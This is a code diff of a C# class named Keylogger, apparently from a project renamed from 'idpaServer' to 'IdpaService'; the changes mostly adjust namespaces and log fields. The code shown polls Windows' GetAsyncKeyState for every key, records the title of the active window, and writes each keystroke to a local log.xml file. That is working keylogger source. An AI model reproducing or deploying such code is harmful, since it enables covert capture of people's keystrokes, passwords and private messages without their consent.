@@ -6,9 +6,8 @@ using System.Threading.Tasks;
 using System.Runtime.InteropServices;
 using System.IO;
 using System.Diagnostics;
-using IdpaTools;
 
-namespace idpaServer
+namespace IdpaService
 {
    
     static class Keylogger
@@ -16,7 +15,7 @@ namespace idpaServer
         static private string LOG_PATH = Controller.APP_PATH + @"\log.xml"; //Where the logfile will be stored
 
         static private string activeWindow;
-        static private IdpaTools.Logger logger;
+        static private Logger logger;
 
         //Import DDLs form Windows (needed for Captioring Keys)
         [DllImport("User32.dll")]
@@ -36,7 +35,7 @@ namespace idpaServer
 
         static Keylogger()
         {
-            logger = new IdpaTools.Logger();
+            logger = new Logger();
             activeWindow = "";
             logger = Serilizer.getDataFromFile(LOG_PATH, logger);
         }
@@ -58,18 +57,17 @@ namespace idpaServer
             if (activeWindow != GetActiveWindowTitle() && GetActiveWindowTitle() != null)
             {
                 activeWindow = GetActiveWindowTitle();
-                logger.applicationLog.Add(new IdpaTools.ApplicationLog());
+                logger.applicationLog.Add(new ApplicationLog());
 
-                logger.applicationLog.Last<IdpaTools.ApplicationLog>().processName = GetActiveProcessFileName();
-                logger.applicationLog.Last<IdpaTools.ApplicationLog>().windowName = activeWindow;
-                logger.applicationLog.Last<IdpaTools.ApplicationLog>().date = DateTime.Now;
+                logger.applicationLog.Last<ApplicationLog>().applicationName = activeWindow;
+                logger.applicationLog.Last<ApplicationLog>().date = DateTime.Now;
             }
 
             foreach (System.Int32 i in Enum.GetValues(typeof(System.Windows.Forms.Keys))) //Iterate through each key to know whether it was pressed or not
             {
                 if (GetAsyncKeyState(i) == -32767)   //-32767(minimum value) indicates that key was pressed since we last called this function
                 {
-                    logger.applicationLog.Last<IdpaTools.ApplicationLog>().keyList.Add(Enum.GetName(typeof(System.Windows.Forms.Keys), i));
+                    logger.applicationLog.Last<ApplicationLog>().keyList.Add(Enum.GetName(typeof(System.Windows.Forms.Keys), i));
                 }
             }
         }
